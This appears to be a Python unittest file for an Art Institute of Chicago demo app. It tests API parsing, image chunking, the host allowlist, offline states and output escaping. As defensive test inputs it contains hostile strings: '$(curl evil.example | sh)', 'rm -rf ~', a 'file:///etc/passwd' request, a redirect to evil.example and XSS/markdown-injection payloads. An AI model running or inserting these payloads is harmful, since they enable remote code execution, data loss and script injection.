"""script-template (the Art Institute of Chicago demo): reading the answer, the picture path (thumbnail to inline data: image split over row fields), the host allowlist,
the offline and old-copy states, and that the app file agrees with config.json."""
import importlib.util
import json
import os
import shutil
import sys
import tempfile
import unittest
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
EX = os.path.abspath(os.path.join(HERE, "..", "..", "examples", "script-template"))
sys.path.insert(0, os.path.join(HERE, ".."))
import bolt_app_kit as kit  # noqa: E402

JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 60
IMG = "3c27b499-af56-f0d5-93b5-a7f2f1ad5813"


def load():
    spec = importlib.util.spec_from_file_location("script_template_t", os.path.join(EX, "scripts", "script-template__app.py"))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


class ScriptTemplateLive(unittest.TestCase):
    def setUp(self):
        self.m = load()
        self.home = tempfile.mkdtemp()
        self._h = os.environ.get("HOME")
        self._up = os.environ.get("USERPROFILE")
        os.environ["HOME"] = self.home
        os.environ["USERPROFILE"] = self.home
        self.cfg = self.m.load_json("config.json")
        self.fx = self.m.load_json("fixtures.json")

    def tearDown(self):
        if self._h is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = self._h
        if self._up is None:
            os.environ.pop("USERPROFILE", None)
        else:
            os.environ["USERPROFILE"] = self._up
        shutil.rmtree(self.home, ignore_errors=True)

    def src(self, fixture=True, demos=()):
        return self.m.Source(self.cfg, fixture, list(demos), self.fx if fixture else {})

    def rec(self, **over):
        r = {"id": 1, "title": "A painting", "artist_display": "Someone (French)\nmore", "date_display": "1900", "date_start": 1900, "image_id": IMG, "is_public_domain": True,
             "medium_display": "Oil", "place_of_origin": "France", "department_title": "Dept"}
        r.update(over)
        return r

    def test_only_public_domain_artworks_with_a_picture_and_a_plain_id_are_kept(self):
        raw = {"data": [self.rec(), self.rec(id=2, is_public_domain=False), self.rec(id=3, image_id=None), self.rec(id="../x"), self.rec(id=5, image_id="not/a-uuid"), "junk", self.rec(id=6, title=None)]}
        got = self.m.n_items(raw, self.cfg)
        self.assertEqual([i["id"] for i in got], ["1"])
        self.assertEqual(got[0]["artist"], "Someone (French)")   # first line only
        with self.assertRaises(ValueError):
            self.m.n_items({"data": [self.rec(id="../x")]}, self.cfg)   # records but none usable: unread, not "no artwork"
        with self.assertRaises(ValueError):
            self.m.n_items({"nope": 1}, self.cfg)

    def test_a_year_that_is_not_an_integer_is_left_out_not_zero(self):
        it = self.m.n_item(self.rec(date_start="1900", title="T"), self.cfg)
        self.assertIsNone(it["year"])

    def test_description_html_is_stripped_and_cleaned(self):
        it = self.m.n_item(self.rec(description="<p>One &amp; two</p>\n<p><em>Three</em>‮</p>", credit_line="Gift"), self.cfg)
        self.assertIn("One & two", it["description"]); self.assertIn("Three", it["description"])
        self.assertNotIn("<", it["description"]); self.assertNotIn("‮", it["description"])

    def test_the_picture_is_split_over_fields_under_the_4000_character_cut_and_joins_back(self):
        img = self.m.DATA_PREFIX + "/9j/" + "A" * 9000
        f = self.m.img_fields(img, self.cfg)
        self.assertEqual(sorted(f), ["img1", "img2", "img3"])
        self.assertTrue(all(len(v) <= 4000 for v in f.values()))
        self.assertEqual("".join(f[k] for k in sorted(f)), img)
        self.assertEqual(self.m.img_fields("x" * 16001, self.cfg), {})   # more than the four fields hold: no picture, the row stays
        self.assertEqual(self.m.img_fields("", self.cfg), {})
        row = kit.row("t", "s", **f)   # the kit keeps every field whole
        self.assertEqual("".join(row[k] for k in sorted(f)), img)

    def test_a_thumbnail_too_big_for_the_fields_is_retried_smaller_then_dropped(self):
        s = self.src(fixture=False)
        calls = []

        def fake(cfg, url, accept, cap, timeout):
            calls.append(url)
            return (JPEG, len(calls) == 1)   # the first width is too big
        self.m.http_bytes = fake
        s._thumb_end = 1e12
        out = s.fetch_thumb(IMG)
        self.assertTrue(out and out.startswith("/9j/"))
        self.assertEqual(len(calls), 2)
        self.assertIn("/full/140,/0/", calls[0]); self.assertIn("/full/110,/0/", calls[1])
        calls[:] = []
        self.m.http_bytes = lambda *a: (calls.append(1) or (JPEG, True))
        self.assertIsNone(s.fetch_thumb(IMG))
        self.assertEqual(len(calls), 3)   # every width tried, then no picture
        self.m.http_bytes = lambda *a: (b"<html>blocked</html>", False)   # a 200 that is not a JPEG
        self.assertIsNone(s.fetch_thumb(IMG))

        def boom(*a):
            raise self.m.Fail("fail", "timed out")
        self.m.http_bytes = boom
        self.assertIsNone(s.fetch_thumb(IMG))

    def fx_raw(self, url):
        """A plausible answer for the list call and for the counts call."""
        if "limit=0" in url:
            return {"pagination": {"total": 40}, "aggregations": {"pd": {"doc_count": 30, "depts": {"buckets": [{"key": "Prints and Drawings", "doc_count": 20}, {"key": "Arts of Asia", "doc_count": 8}], "sum_other_doc_count": 2},
                    "periods": {"buckets": [{"doc_count": n} for n in (1, 2, 3, 4, 5, 6, 9)]}}}}
        return {"data": [self.rec()], "pagination": {"total": 30}}

    def test_every_host_contacted_is_https_and_in_the_allowlist_and_typed_text_is_only_percent_encoded(self):
        urls = []
        m = self.m
        m.http_json = lambda cfg, url, budget: (urls.append(url) or self.fx_raw(url))
        m.http_bytes = lambda cfg, url, accept, cap, timeout: (urls.append(url) or (JPEG, False))
        s = self.src(fixture=False)
        data, state = s.search("a&b=c/../d x", True, False)
        s.attach_thumbs(data["items"], network=True)
        self.assertTrue(data["items"] and data["items"][0]["img"].startswith(m.DATA_PREFIX))
        self.assertEqual(data["facets"]["pd"], 30)
        self.assertEqual(len(urls), 3)   # the list, the counts, one picture
        for u in urls:
            p = urllib.parse.urlparse(u)
            self.assertEqual(p.scheme, "https")
            self.assertIn(p.hostname, self.cfg["hosts"])
        for u in urls[:2]:
            q = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
            self.assertEqual(q["query[bool][must][0][multi_match][query]"], ["a&b=c/../d x"])   # arrives as one value: nothing typed became a parameter or a path
            self.assertNotIn("&b=c", u)
        self.assertEqual(sorted(set(urllib.parse.urlparse(u).hostname for u in urls)), sorted(self.cfg["hosts"]))   # the API host and the picture host, both named

    def test_the_network_layer_refuses_other_hosts_schemes_and_ports(self):
        load_again = load()
        for url in ("http://api.artic.edu/x", "https://evil.example/x", "https://api.artic.edu:8443/x", "file:///etc/passwd"):
            with self.assertRaises(load_again.Fail):
                load_again.http_bytes(self.cfg, url, "application/json", 100, 2)
        h = load_again._SameHost()
        h.hosts = tuple(self.cfg["hosts"])
        import urllib.request
        req = urllib.request.Request("https://api.artic.edu/a")
        with self.assertRaises(load_again.Fail):
            h.redirect_request(req, None, 302, "Found", {}, "https://evil.example/b")
        with self.assertRaises(load_again.Fail):
            h.redirect_request(req, None, 302, "Found", {}, "https://www.artic.edu/b")   # an allowed host, but not the one that was asked

    def test_a_cached_thumbnail_is_used_without_the_network_and_a_miss_is_not_retried(self):
        s = self.src(fixture=False)
        s.thumbs.put(IMG, {"t": "/9j/AAAA"})
        s.misses.put("00000000-0000-0000-0000-000000000000", {"m": 1})
        self.m.http_bytes = lambda *a: self.fail("the network must not be used")
        items = [{"image_id": IMG}, {"image_id": "00000000-0000-0000-0000-000000000000"}]
        s.attach_thumbs(items, network=True)
        self.assertEqual(items[0]["img"], self.m.DATA_PREFIX + "/9j/AAAA")
        self.assertEqual(items[1]["img"], "")

    def test_a_hostile_cache_file_is_not_a_picture(self):
        s = self.src(fixture=False)
        s.thumbs.put(IMG, {"t": "<script>alert(1)</script>"})
        items = [{"image_id": IMG}]
        s.attach_thumbs(items, network=False)
        self.assertEqual(items[0]["img"], "")

    def test_every_view_passes_the_row_contract_and_a_picture_row_carries_its_picture(self):
        for view, arg in (("overview", ""), ("items", ""), ("pictures", ""), ("chart", ""), ("table", ""), ("item", "5848"), ("item", "874"), ("record", "5848")):
            s = self.src()
            if view in ("item", "record"):
                it, state = s.detail(arg, False)
                s.attach_heroes([it], network=False)
                rows = self.m.build_item(view, it, state, self.cfg, True)
            else:
                data, state = s.search("landscape", False, False)
                s.attach_thumbs(data["items"], network=False)
                rows = self.m.build(view, arg, data, state, self.cfg, True, "landscape")
            self.assertEqual(kit.validate_rows(rows), [], view)
            pics = [r for r in rows if r.get("img1")]
            if view in ("items", "pictures") or (view, arg) == ("item", "5848"):
                self.assertTrue(pics, view)
            for r in pics:
                n = 24 if view == "item" else 4
                joined = "".join(r.get("img%d" % k, "") for k in range(1, n + 1))
                self.assertTrue(joined.startswith("data:image/jpeg;base64,/9j/"))
                self.assertLessEqual(len(joined), n * 4000)

    def test_the_overview_tiles_carry_a_meter_a_sparkline_and_a_delta_and_only_numbers(self):
        s = self.src()
        data, state = s.search("landscape", False, False)
        rows = self.m.build("overview", "", data, state, self.cfg, True, "landscape")
        tiles = [r for r in rows if r.get("kpi_label")]
        self.assertEqual(len(tiles), 5)   # four data tiles and the refresh row, which Bolt draws as a tile too
        for r in tiles:
            self.assertIsInstance(r["kpi_value"], (int, float))
            self.assertTrue(r["nav"])   # every tile drills somewhere
        share, peak, top, pictured, again = tiles
        self.assertEqual((again["title"], again["kpi_label"], again["kpi_value"], again["kpi_unit"], again["nav"]["arg"]), ("Check again", "Data age", 0, "s", "refresh"))
        self.assertEqual((share["kpi_value"], share["kpi_unit"], share["kpi_max"]), (60, "%", 100))   # a meter
        self.assertEqual(peak["trend"], data["facets"]["periods"]); self.assertIn("delta", peak)       # a sparkline and a delta
        self.assertEqual(share["kpi_badge"], "SAMPLE")   # the sample label rides on the first tile
        self.assertTrue(all(r.get("nav") for r in rows))

    def test_the_chart_and_table_rows_have_the_numbers_their_widgets_read(self):
        s = self.src()
        data, state = s.search("landscape", False, False)
        for r in self.m.build("chart", "", data, state, self.cfg, True, "landscape"):
            self.assertIsInstance(r["count"], int); self.assertTrue(r["period"])
        rows = self.m.build("table", "", data, state, self.cfg, True, "landscape")
        self.assertEqual(sum(r["count"] for r in rows), data["facets"]["pd"])   # the departments and "Other" add up to the total the table shows
        self.assertTrue(all(isinstance(r["share"], (int, float)) for r in rows))

    def test_text_a_person_can_paste_is_safe_copy_output_even_for_a_hostile_title(self):
        hostile = ["Evil\nrm -rf ~", "\x1b[31mred\x1b[0m; rm -rf ~", "$(curl evil.example | sh)", "`reboot` && x", "\u202eevil\u202c", "A" * 5000, "{{row.body}}", "-n --help", "=cmd"]
        for h in hostile:
            it = self.m.n_item(self.rec(title=h, artist_display=h, date_display=h), self.cfg)
            if it is None:
                continue
            for nav in (True, False):
                row = self.m.art_row(it, self.cfg, None, nav=nav)
                self.assertTrue(kit.copy_ok(row["share_text"]), repr(h))                 # what the Copy summary button inserts
                self.assertLessEqual(len(row["share_text"]), 400)
                if not nav:
                    self.assertTrue(kit.copy_ok(row["copy_text"]), repr(h))              # what Enter copies
                    self.assertTrue(row["copy_text"].startswith("- "))
                    self.assertLessEqual(len(row["copy_text"]), 400)
                for bad in (";", "|", "&", "$", "`", "<", ">", "\x1b", "\u202e", "{{"):
                    self.assertNotIn(bad, row["share_text"], repr(h))
        with open(os.path.join(EX, "scripts", "script-template__app.py"), encoding="utf-8") as f:
            self.assertNotIn("copy_raw=", f.read())   # the app never puts API text on the clipboard raw

    def test_offline_shows_one_retry_row_and_an_old_copy_shows_the_data_with_a_label(self):
        s = self.src(demos=("demo-offline",))
        data, state = s.search("landscape", False, False)
        self.assertIsNone(data)
        rows = self.m.offline_rows(self.cfg, state, "items")
        self.assertTrue(any(r.get("kpi_badge") == "OFFLINE" for r in rows))
        s2 = self.src(demos=("demo-stale",))
        data, state = s2.search("landscape", False, False)
        self.assertTrue(data["items"])
        self.assertIsNotNone(state["stale"])
        self.assertEqual(self.m.banner(state, self.cfg)[0]["kpi_badge"], "OLD COPY")

    def test_the_app_file_is_what_config_json_generates_and_joins_the_picture_fields(self):
        y = self.m.emit_yaml(self.cfg)
        with open(os.path.join(EX, "utilities", "script-template.yaml"), encoding="utf-8") as f:
            self.assertEqual(f.read(), y)
        self.assertIn("{{row.img1}}{{row.img2}}{{row.img3}}", y)
        self.assertIn("{{row.img24}}){{row.hero_lines}}", y)   # the big picture of the list and detail panes: markdown over img1 to img24
        for kind in ("kind: cards", "kind: chart", "kind: table", "kind: json_tree", "kind: entity_preview", "kind: markdown"):
            self.assertIn(kind, y)
        self.assertNotIn("http", y.split("presentation:")[1].split("actions:")[0])   # no web address in any pane bind

    def test_only_the_detail_row_carries_the_big_picture_and_the_list_rows_stay_small(self):
        s = self.src()
        data, state = s.search("landscape", False, False)
        s.attach_thumbs(data["items"], network=False)
        rows = self.m.build("items", "", data, state, self.cfg, True, "landscape")
        for r in rows:
            self.assertNotIn("hero_lines", r)
            self.assertNotIn("img5", r)   # the list rows hold the small picture only (img1 to img4)
        it, state = s.detail("5848", False)
        s.attach_heroes([it], network=False)
        row = [r for r in self.m.build_item("item", it, state, self.cfg, True) if r.get("hero_lines")]
        self.assertEqual(len(row), 1)
        r = row[0]
        self.assertTrue(r["hero_lines"].startswith("&nbsp;"))
        self.assertIn("Image and data", r["hero_lines"])
        self.assertEqual(r["hero_alt"], "Artwork")
        self.assertTrue(r["open_url"] and r["share_text"])   # the Open source and Copy summary buttons still have their values
        f = [r["img%d" % k] for k in range(1, 25) if r.get("img%d" % k)]
        self.assertGreater(len(f), 10)
        self.assertTrue(all(len(x) <= 4000 for x in f))
        self.assertTrue("".join(f).startswith("data:image/jpeg;base64,/9j/"))
        self.assertLess(len(json.dumps(r)), 120000)
        it2, state2 = s.detail("874", False)   # no recorded big picture: the same pane as text, with the note
        s.attach_heroes([it2], network=False)
        r2 = [x for x in self.m.build_item("item", it2, state2, self.cfg, True) if x.get("hero_lines")][0]
        self.assertEqual(r2["hero_alt"], "No picture here: it is on Open source")
        self.assertNotIn("img1", r2)

    def test_a_big_picture_that_does_not_fit_the_fields_is_dropped_and_the_row_stays(self):
        s = self.src(fixture=False)
        im = self.cfg["images"]["hero"]
        room = im["chunk_chars"] * im["max_chunks"]
        big = "/9j/" + "A" * room
        s.heroes.put(IMG, {"t": "/9j/AAAA"})
        items = [{"image_id": IMG}]
        s.attach_heroes(items, network=False)
        self.assertTrue(items[0]["hero"].startswith("data:image/jpeg;base64,/9j/"))
        self.assertEqual(self.m.hero_fields("x" * (room + 1), self.cfg), {})
        self.assertEqual(len(self.m.hero_fields(self.m.DATA_PREFIX + big[:room - 100], self.cfg)), im["max_chunks"])

    def test_every_api_string_that_enters_a_markdown_body_is_escaped_to_plain_text(self):
        hostile = "](javascript:alert(1)) ![x](https://evil/x.png) <img src=x onerror=alert(1)> **bold** `code` [a](b) <https://evil.example> a_b_c | x &lt; www.evil.example me@example.com # h\\"
        it = self.m.n_item(self.rec(title=hostile, artist_display=hostile, date_display=hostile, medium_display=hostile, place_of_origin=hostile, department_title=hostile, description=hostile, credit_line=hostile, dimensions=hostile), self.cfg)
        facets = {"periods": [1, 2, 3, 4, 5, 6, 7]}
        for full in (False, True):
            body = self.m.hero_markdown(it, self.cfg, facets, full)
            for line in body.split("\n"):
                if line.startswith(("### ", "- ", "*")) or ":" in line or "\\" in line:
                    # the only markdown that is NOT an escape: the heading hash, the list dash, the emphasis stars, our own labels
                    plain = __import__("re").sub(r"\\.", "", line)
                    plain = plain.replace("### ", "", 1) if plain.startswith("### ") else plain
                    plain = plain[2:] if plain.startswith("- ") else plain
                    plain = plain[1:-1] if plain.startswith("*") and plain.endswith("*") else plain
                    for ch in "[]()<>`*_|!#&~{}":
                        self.assertNotIn(ch, plain, (ch, line))
        # an escaped string reads back as the cleaned text
        un = lambda t: __import__("re").sub(r"\\(.)", r"\1", t)
        self.assertEqual(un(self.m.md_escape(hostile)), kit.clean_text(hostile))
        row = self.m.hero_row(it, self.cfg, facets)
        self.assertEqual(kit.validate_rows([row]), [])
        self.assertNotIn("](javascript", row["hero_lines"].replace("\\]\\(", ""))

    def test_no_long_dashes_in_the_example_and_api_text_is_tidied(self):
        root = os.path.abspath(os.path.join(EX))
        for d, _, files in os.walk(root):
            for fn in files:
                if fn.endswith("__bolt_app_kit.py") or not fn.endswith((".json", ".py", ".md", ".yaml")):
                    continue   # the vendored kit is generated, not ours
                with open(os.path.join(d, fn), encoding="utf-8") as f:
                    t = f.read()
                self.assertNotIn("\u2014", t, fn)
                self.assertNotIn("\u2013", t, fn)
        it = self.m.n_item(self.rec(title="A \u2014 B", artist_display="X (1594\u20131665)", description="<p>one\u2014but two\u2013three, well-known</p>"), self.cfg)
        self.assertEqual(it["title"], "A, B"); self.assertEqual(it["artist"], "X (1594-1665)")
        self.assertIn("one, but two-three, well-known", it["description"])

    def test_a_4xx_is_not_offline_and_429_says_busy(self):
        for code, kind, title in ((403, "http", "did not accept that search"), (429, "rate", "is busy")):
            def boom(*a, **k):
                raise self.m.Fail(kind, "answered %d" % code)
            self.m.http_json = boom
            data, state = self.src(fixture=False).search("zzqq%d" % code, True, True)
            self.assertIsNone(data)
            rows = self.m.offline_rows(self.cfg, state, "items")
            text = json.dumps(rows)
            self.assertIn(title, text); self.assertNotIn("Could not reach", text); self.assertNotIn("OFFLINE", text)
        def conn(*a, **k):
            raise self.m.Fail("fail", "could not connect")
        self.m.http_json = conn
        data, state = self.src(fixture=False).search("zzqq", True, True)
        self.assertIn("OFFLINE", json.dumps(self.m.offline_rows(self.cfg, state, "items")))

    def run_cli(self, args, env=None):
        import subprocess
        e = dict(os.environ, HOME=self.home, USERPROFILE=self.home, BOLT_APP_FIXTURE="0"); e.update(env or {})
        k = [os.path.join(EX, "scripts", "script-template__" + n) for n in ("config.json", "fixtures.json", "bolt_app_kit.py")]
        r = subprocess.run([sys.executable, os.path.join(EX, "scripts", "script-template__app.py")] + args + k, capture_output=True, text=True, env=e, timeout=60)
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)

    def test_path_looking_words_are_refused_before_any_request(self):
        for w in ("../x", "a/b", "..", "a\\b"):
            rows = self.run_cli(["items", w], {"https_proxy": "http://127.0.0.1:9"})
            self.assertEqual([r["title"] for r in rows], ["Back", "Type a word or two"], w)

    def test_cold_offline_is_one_retry_row_and_a_blocked_picture_host_leaves_rows_without_pictures(self):
        dead = {"https_proxy": "http://127.0.0.1:9", "HTTPS_PROXY": "http://127.0.0.1:9"}
        rows = self.run_cli(["overview"], dead)
        self.assertEqual([r["title"] for r in rows], ["Could not reach Art Institute of Chicago", "Try again"])
        self.assertEqual(rows[0]["kpi_badge"], "OFFLINE")
        m = self.m
        m.http_json = lambda cfg, url, budget: self.fx_raw(url)
        def nopic(*a, **k):
            raise m.Fail("fail", "could not connect")
        m.http_bytes = nopic
        s = self.src(fixture=False)
        data, state = s.search("landscape", False, True)
        s.attach_thumbs(data["items"], network=True)
        rows = m.build("items", "", data, state, self.cfg, False, "landscape")
        self.assertEqual(kit.validate_rows(rows), [])
        self.assertTrue(any(r.get("nav") and r["nav"].get("view") == "item" for r in rows))
        self.assertFalse(any(r.get("img1") for r in rows))

    def test_no_key_is_asked_for(self):
        self.assertNotIn("key_env", self.cfg["api"])


if __name__ == "__main__":
    unittest.main()
